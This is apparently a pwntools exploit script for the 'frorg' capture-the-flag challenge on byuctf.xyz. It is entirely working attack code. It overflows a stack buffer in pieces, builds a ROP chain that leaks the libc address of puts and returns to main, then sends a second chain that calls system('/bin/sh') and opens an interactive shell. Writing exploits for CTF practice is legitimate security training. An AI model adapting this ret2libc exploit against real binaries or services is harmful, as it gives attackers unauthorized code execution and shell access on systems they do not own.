from pwn import *
import sys

elf = ELF("frorg_patched")
libc = ELF("libc.so.6")

# io = process(elf.path)
io = remote('byuctf.xyz', 40015)

context.log_level = 'info'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

# gdb.attach(io, gdbscript='''
#     # b *0x0401269
#     b *0x040128f
# ''')

# libc leak and ret2main
p = b'\x00' * 0x2c
p += b'\x04'
p = p.ljust(0x38, b'\x00')
p += p64(next(elf.search(asm('pop rdi; ret'), executable=True)))
p += p64(elf.got["puts"])
p += p64(elf.sym["puts"])
p += p64(elf.sym["main"])

io.sendlineafter(b'store? \n', str(20).encode())
for i in range((len(p) + 9) // 10):
    io.sendafter(b'name: \n', p[i * 10: min(len(p), (i + 1) * 10)])
while True:
    r = io.recvline()
    print(r)
    if b'name: ' in r:
        io.sendline(str(20).encode())
    else:
        break

r = io.recvline()
libc.address = u64(r[:-1].ljust(8, b'\x00')) - libc.sym["puts"]
log.info(f'libc addr: {hex(libc.address)}')


# exploit!
p = b'\x00' * 0x2c
p += b'\x04'
p = p.ljust(0x38, b'\x00')
p += p64(next(elf.search(asm('pop rdi; ret'), executable=True)))
p += p64(next(libc.search(b'/bin/sh\x00')))
p += p64(next(elf.search(asm('ret'), executable=True)))
p += p64(libc.sym["system"])

io.sendlineafter(b'store? \n', str(20).encode())
io.sendafter(b'name: \n', p, timeout=3)

while True:
    r = io.recvline()
    if b'name: ' in r:
        io.send(b'AAA')
    else:
        break

io.interactive()